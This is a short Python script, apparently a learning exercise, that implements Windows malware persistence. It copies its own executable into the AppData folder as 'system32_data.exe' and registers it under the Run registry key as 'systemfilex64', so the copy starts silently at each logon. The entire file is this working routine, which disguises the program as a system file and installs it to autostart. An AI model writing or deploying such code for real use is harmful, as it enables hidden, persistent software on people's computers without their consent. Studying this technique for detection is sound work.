import sys #access to some variables and functions -> the interpreter 
import os #miscellanious operating system dependent funcotionalities
import shutil
import winreg #Window Registery access. Function expose the Windows registry API to Pytohn


curr_executable = sys.executable 
print("Current executable :" , curr_executable )

#Return the value of the env variable key
app_data = os.getenv("APPDATA")
#Rename executable system32_data.exe
to_save_file = app_data + "\\"+"system32_data.exe"
#Copy the executable to AppData foldler on Windows
#shutil module high-level operations on file
shutil.copyfile(curr_executable, to_save_file)     
key = winreg.HKEY_CURRENT_USER
key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
key_obj = winreg.OpenKey(key, key_value, 0 , winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)
winreg.CloseKey(key_obj)